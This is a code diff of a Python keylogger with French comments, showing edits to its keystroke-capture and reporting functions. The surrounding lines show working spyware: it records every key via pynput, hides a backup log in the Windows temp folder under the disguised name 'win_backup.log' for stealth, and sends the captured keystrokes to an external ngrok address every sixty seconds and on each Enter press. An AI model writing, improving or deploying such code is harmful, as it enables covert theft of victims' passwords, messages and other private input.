@@ -12,7 +12,7 @@ NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev"
 INTERVAL_SECONDS = 60 # Envoi toutes les 60 secondes
 
 # --- Gestion du Chemin de Sauvegarde Windows (Furtivité) ---
-# Utilise le dossier temporaire de Windows pour cacher le fichier de sauvegarde locale.
+# Le log de secours est caché dans le répertoire temporaire de l'utilisateur.
 LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 
 
 # Variables globales
@@ -44,7 +44,7 @@ def send_log_data(data):
         if response.status_code == 200:
             # SUCCÈS : Vide le buffer pour éviter la répétition du log.
             log_buffer = "" 
-            
+             
     except requests.exceptions.RequestException:
         # Échec de la connexion : ne vide PAS le buffer.
         pass
@@ -52,7 +52,6 @@ def send_log_data(data):
 def report():
     """
     Fonction d'envoi exécutée en parallèle toutes les INTERVAL_SECONDS.
-    Elle est lancée dans un thread séparé.
     """
     global log_buffer
     
@@ -69,10 +68,12 @@ def on_press(key):
     """
     global log_buffer
     
+    current_key = None
+    
     try:
         # Tente d'obtenir le caractère (A, b, 1, $, etc.)
-        char = key.char
-        log_buffer += char
+        current_key = key.char
+        log_buffer += current_key
         
     except AttributeError:
         # Gère les touches spéciales
@@ -82,7 +83,8 @@ def on_press(key):
         elif key == pynput.keyboard.Key.enter:
             log_buffer += "\n"
             
-            # VÉRIFICATION CRUCIALE ANTI-ENVOI VIDE
+            # VÉRIFICATION CRUCIALE ANTI-ENVOI VIDE :
+            # Si le buffer (sans les espaces et \n) contient du texte significatif, on envoie.
             if log_buffer.strip():
                 send_log_data(log_buffer)
             
